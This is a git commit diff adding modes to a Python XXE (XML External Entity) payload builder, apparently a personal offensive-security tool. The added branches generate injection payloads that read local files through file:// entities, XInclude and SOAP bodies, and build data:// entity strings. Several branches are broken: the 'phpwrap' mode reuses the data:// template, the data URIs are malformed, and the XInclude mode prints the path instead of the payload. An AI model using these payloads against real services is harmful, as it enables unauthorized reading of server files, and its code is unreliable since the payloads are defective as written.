6f4c7174b05618027a24f9cfdc8c0a883c4ca044
FrancescoDiSalesGithub <f.disales@hotmail.com>
2021-11-21 17:03:14 +0100

    adding new features to the builder

--- xxe_builder.py
+++ xxe_builder.py
@@ -19,3 +19,21 @@ class xxe_builder:
                 text = text + '<!ENTITY {} SYSTEM "file:///">';
             final = text + ']>'
             print(final)
+        elif self.__motive == "base64":
+            base64_content=input("insert base64 content")
+            text = '<!DOCTYPE foo [<!ENTITY {} SYSTEM  "data://text/plain;base64 {} >]>'.format(str(self.__entity),str(base64_content))
+            print(text)
+        elif self.__motive == "phpwrap":
+            php_filter = input("insert php filter command:")
+            text = '<!DOCTYPE foo [<!ENTITY {} SYSTEM  "data://text/plain;base64 {} >]>'.format(str(self.__entity),str(php_filter))
+            print(text)
+        elif self.__motive == "xinclude":
+            xinclude_file=input("insert the path of the file you want to search")
+            xinclude_header='<foo xmlns:xi="http://www.w3.org/2001/XInclude">'
+            xinclude_command='<xi:include parse="text" href="file://{}"/></foo>'.format(str(xinclude_file))
+            print(xinclude_header)
+            print(xinclude_file)
+        elif self.__motive == "soap":
+            print("insert this after the tag <soap:Body>")
+            text = '<!DOCTYPE foo [<!ENTITY {} SYSTEM "file:///">]>'.format(str(self.__entity))
+            print(text)
